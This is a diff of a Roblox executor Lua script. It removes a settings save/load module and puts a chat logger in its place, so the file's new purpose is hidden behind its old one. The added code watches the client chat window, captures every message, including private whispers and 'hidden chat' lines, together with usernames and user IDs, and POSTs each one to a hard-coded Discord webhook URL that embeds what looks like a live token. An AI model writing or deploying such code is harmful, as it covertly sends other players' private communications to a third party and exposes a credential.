@@ -1,277 +1,143 @@
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
+local LocalPlayer = Players.LocalPlayer
 
-local SaveScriptsTickBox = script.Parent:WaitForChild("SaveScriptsTickBox")
+local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495387476867551474/KD8pq8e7P-nU7O2jEhKpTCV2G1wzWVDcjZ07bEOWGaJr-twJChTw5ZBSibfONVwfqaui"
 
-local function findMainFrame()
-	local current = script.Parent
-	while current do
-		if current.Name == "MainFrame" then
-			return current
-		end
-		current = current.Parent
+local CoreGui = game:GetService("CoreGui")
+local ExperienceChat = CoreGui:WaitForChild("ExperienceChat")
+local chatWindow = ExperienceChat:WaitForChild("appLayout"):WaitForChild("chatWindow")
+local scrollingView = chatWindow:WaitForChild("scrollingView")
+local bottomLockedScrollView = scrollingView:WaitForChild("bottomLockedScrollView")
+local RCTScrollView = bottomLockedScrollView:WaitForChild("RCTScrollView")
+local RCTScrollContentView = RCTScrollView:WaitForChild("RCTScrollContentView")
+
+local processedFrames = {}
+
+local function getEmbedColor(buttonText)
+	-- Check for spychat (HIDDEN CHAT)
+	if string.match(buttonText, "HIDDEN CHAT") then
+		return 0xff0000 -- Red for spychat
 	end
-	return nil
+	
+	-- Check for private messages
+	if string.match(buttonText, "%[From") or string.match(buttonText, "%[To") then
+		return 0x000000 -- Black for private messages
+	end
+	
+	-- Extract RGB from font color
+	local r, g, b = string.match(buttonText, "rgb%((%d+),(%d+),(%d+)%)")
+	if r and g and b then
+		r, g, b = tonumber(r), tonumber(g), tonumber(b)
+		-- Convert RGB to hex color
+		return (r * 65536) + (g * 256) + b
+	end
+	
+	-- Default color if nothing matches
+	return 0xffffff
 end
 
-local MainFrame = findMainFrame()
-
-if not MainFrame then
-	warn("[SaveScripts] Could not find MainFrame!")
-	return
+local function extractDisplay(buttonText)
+	-- Try to extract display name from the text
+	local display = string.match(buttonText, "%((.-)%)")
+	return display or "Unknown"
 end
 
-local FILE_NAME = "universalscript_save.txt"
-local saveEnabled = false
-local isApplyingLoad = false
-
-local function readFile()
-	local success, result = pcall(function()
-		return readfile(FILE_NAME)
+local function sendWebhook(username, userId, message, embedColor, buttonText)
+	local isPrivate = string.match(buttonText, "%[From") or string.match(buttonText, "%[To")
+	local isHidden = string.match(buttonText, "HIDDEN CHAT")
+	
+	local titlePrefix = ""
+	if isPrivate then
+		titlePrefix = "(PRIVATE) "
+	elseif isHidden then
+		titlePrefix = "(HIDDEN) "
+	end
+	
+	local embed = {
+		["title"] = titlePrefix .. "Display: " .. extractDisplay(buttonText),
+		["description"] = "**" .. username .. "**: " .. message,
+		["color"] = embedColor,
+		["footer"] = {
+			["text"] = "User ID: " .. userId
+		}
+	}
+	
+	local payload = {
+		["embeds"] = {embed}
+	}
+	
+	local success, err = pcall(function()
+		request({
+			Url = WEBHOOK_URL,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = HttpService:JSONEncode(payload)
+		})
 	end)
-	if success and result and result ~= "" then return result end
-	return nil
-end
-
-local function writeFile(content)
-	pcall(function()
-		writefile(FILE_NAME, content)
-	end)
-end
-
-local function loadSave()
-	local data = readFile()
-	if not data then return nil end
-	local decoded = {}
-	for line in data:gmatch("[^\n]+") do
-		local key, value = line:match("(.-)=(.+)")
-		if key and value then
-			decoded[key] = value
-		end
-	end
-	if decoded["saveEnabled"] ~= "true" then return nil end
-	return next(decoded) and decoded or nil
-end
-
-local function isTickBox(child)
-	if not child:IsA("TextButton") then return false end
-	if not child.Name:match("TickBox$") then return false end
-	return true
-end
-
-local function isChanger(child)
-	if not child:IsA("TextBox") then return false end
-	if not child.Name:match("Changer$") then return false end
-	return true
-end
-
-local function isTickBoxEnabled(tickBox)
-	local color = tickBox.BackgroundColor3
-	return color.R == 0 and math.abs(color.G - 123/255) < 0.01 and color.B == 1
-end
-
-local function saveData()
-	if not saveEnabled then return end
-	if not MainFrame or not MainFrame.Parent then return end
 	
-	local lines = {}
-	table.insert(lines, "saveEnabled=true")
-
-	local pos = MainFrame.Position
-	table.insert(lines, "posXScale=" .. pos.X.Scale)
-	table.insert(lines, "posXOffset=" .. pos.X.Offset)
-	table.insert(lines, "posYScale=" .. pos.Y.Scale)
-	table.insert(lines, "posYOffset=" .. pos.Y.Offset)
-
-	local ContentArea = MainFrame:FindFirstChild("ContentArea")
-	if not ContentArea then return end
-
-	-- Traverse: ContentArea -> ScrollingFrame (pages) -> Frame (sides) -> Frame (groups) -> Frame (rows) -> TickBox/Changer
-	for _, page in pairs(ContentArea:GetChildren()) do
-		if page:IsA("ScrollingFrame") then  -- CHANGED: Check for ScrollingFrame instead of Frame
-			for _, side in pairs(page:GetChildren()) do
-				if side:IsA("Frame") then
-					for _, group in pairs(side:GetChildren()) do
-						if group:IsA("Frame") then
-							for _, row in pairs(group:GetChildren()) do
-								if row:IsA("Frame") then
-									for _, child in pairs(row:GetChildren()) do
-										if isTickBox(child) then
-											local enabled = isTickBoxEnabled(child)
-											table.insert(lines, row.Name .. "_" .. child.Name .. "=" .. tostring(enabled))
-										end
-										
-										if isChanger(child) then
-											if child.Text ~= "" and child.Text ~= child.PlaceholderText then
-												table.insert(lines, row.Name .. "_" .. child.Name .. "_text=" .. child.Text)
-											end
-										end
-									end
-								end
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-
-	writeFile(table.concat(lines, "\n"))
-end
-
-local function applyLoad(data)
-	if not data or isApplyingLoad then return end
-	if not MainFrame or not MainFrame.Parent then return end
-	
-	isApplyingLoad = true
-	MainFrame:SetAttribute("IsLoading", true)
-	
-	local wasDraggable = MainFrame.Draggable
-	MainFrame.Draggable = false
-
-	local xScale = tonumber(data["posXScale"])
-	local xOffset = tonumber(data["posXOffset"])
-	local yScale = tonumber(data["posYScale"])
-	local yOffset = tonumber(data["posYOffset"])
-	
-	if xScale and xOffset and yScale and yOffset then
-		MainFrame.Position = UDim2.new(xScale, xOffset, yScale, yOffset)
-	end
-
-	task.wait(0.5)
-
-	local ContentArea = MainFrame:FindFirstChild("ContentArea")
-	if not ContentArea then 
-		isApplyingLoad = false
-		MainFrame:SetAttribute("IsLoading", false)
-		MainFrame.Draggable = wasDraggable
-		return 
-	end
-
-	-- First: Load TextBox values
-	for _, page in pairs(ContentArea:GetChildren()) do
-		if page:IsA("ScrollingFrame") then  -- CHANGED
-			for _, side in pairs(page:GetChildren()) do
-				if side:IsA("Frame") then
-					for _, group in pairs(side:GetChildren()) do
-						if group:IsA("Frame") then
-							for _, row in pairs(group:GetChildren()) do
-								if row:IsA("Frame") then
-									for _, child in pairs(row:GetChildren()) do
-										if isChanger(child) then
-											local savedText = data[row.Name .. "_" .. child.Name .. "_text"]
-											if savedText then
-												child.Text = savedText
-											end
-										end
-									end
-								end
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-
-	task.wait(0.3)
-
-	-- Second: Click TickBoxes
-	for _, page in pairs(ContentArea:GetChildren()) do
-		if not MainFrame or not MainFrame.Parent then break end
-		
-		if page:IsA("ScrollingFrame") then  -- CHANGED
-			for _, side in pairs(page:GetChildren()) do
-				if not MainFrame or not MainFrame.Parent then break end
-				
-				if side:IsA("Frame") then
-					for _, group in pairs(side:GetChildren()) do
-						if not MainFrame or not MainFrame.Parent then break end
-						
-						if group:IsA("Frame") then
-							for _, row in pairs(group:GetChildren()) do
-								if not MainFrame or not MainFrame.Parent then break end
-								
-								if row:IsA("Frame") then
-									for _, child in pairs(row:GetChildren()) do
-										if not MainFrame or not MainFrame.Parent then break end
-										
-										if isTickBox(child) then
-											local savedValue = data[row.Name .. "_" .. child.Name]
-											if savedValue then
-												local shouldBeEnabled = savedValue == "true"
-												local currentlyEnabled = isTickBoxEnabled(child)
-												
-												if shouldBeEnabled and not currentlyEnabled then
-													pcall(function()
-														firesignal(child.MouseButton1Click)
-													end)
-													task.wait(0.2)
-												end
-											end
-										end
-									end
-								end
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-
-	task.wait(0.5)
-	isApplyingLoad = false
-	
-	if MainFrame and MainFrame.Parent then
-		MainFrame:SetAttribute("IsLoading", false)
-		MainFrame.Draggable = wasDraggable
+	if not success then
+		warn("Webhook failed:", err)
 	end
 end
 
-task.spawn(function()
-	while true do
-		task.wait(2)
-		if saveEnabled and MainFrame and MainFrame.Parent then
-			saveData()
-		end
+local function onFrameAdded(frame)
+	if processedFrames[frame] then return end
+	processedFrames[frame] = true
+	
+	-- Check if frame name starts with user ID
+	local frameName = frame.Name
+	local userId = string.match(frameName, "^(%d+)%-")
+	
+	-- Ignore if userId is "0" or nil
+	if not userId or userId == "0" then return end
+	
+	task.wait(0.1) -- Small delay to ensure children are loaded
+	
+	local textMessage = frame:FindFirstChild("TextMessage")
+	if not textMessage then return end
+	
+	local bodyText = textMessage:FindFirstChild("BodyText")
+	local textButton = textMessage:FindFirstChild("TextMessageButton")
+	
+	if not bodyText or not textButton then return end
+	
+	local textButtonButton = textButton:FindFirstChild("TextButton")
+	if not textButtonButton then return end
+	
+	-- Get the message content
+	local message = bodyText.ContentText
+	
+	-- Get the button text for color/type detection
+	local buttonText = textButtonButton.Text
+	
+	-- Get username from Players service
+	local player = Players:GetPlayerByUserId(tonumber(userId))
+	local username = player and player.Name or "Unknown"
+	
+	-- Determine embed color based on button text
+	local embedColor = getEmbedColor(buttonText)
+	
+	-- Send webhook
+	sendWebhook(username, userId, message, embedColor, buttonText)
+end
+
+-- Monitor for new frames being added
+RCTScrollContentView.ChildAdded:Connect(function(child)
+	if child:IsA("Frame") then
+		onFrameAdded(child)
 	end
 end)
 
-script.Parent.AncestryChanged:Connect(function()
-	if not script:IsDescendantOf(game) and saveEnabled then
-		saveData()
+-- Process existing frames
+for _, child in pairs(RCTScrollContentView:GetChildren()) do
+	if child:IsA("Frame") then
+		task.spawn(function()
+			onFrameAdded(child)
+		end)
 	end
-end)
+end
 
-localPlayer.AncestryChanged:Connect(function()
-	if saveEnabled and MainFrame and MainFrame.Parent then
-		saveData()
-	end
-end)
-
-SaveScriptsTickBox.MouseButton1Click:Connect(function()
-	saveEnabled = not saveEnabled
-	if saveEnabled then
-		SaveScriptsTickBox.BackgroundColor3 = Color3.fromRGB(0, 123, 255)
-		saveData()
-	else
-		saveEnabled = false
-		SaveScriptsTickBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-		writeFile("saveEnabled=false")
-	end
-end)
-
-task.spawn(function()
-	task.wait(3)
-	
-	if not MainFrame or not MainFrame.Parent then return end
-	
-	local data = loadSave()
-	if not data then return end
-
-	saveEnabled = true
-	SaveScriptsTickBox.BackgroundColor3 = Color3.fromRGB(0, 123, 255)
-
-	applyLoad(data)
-end)
+print("Chat logger started!")
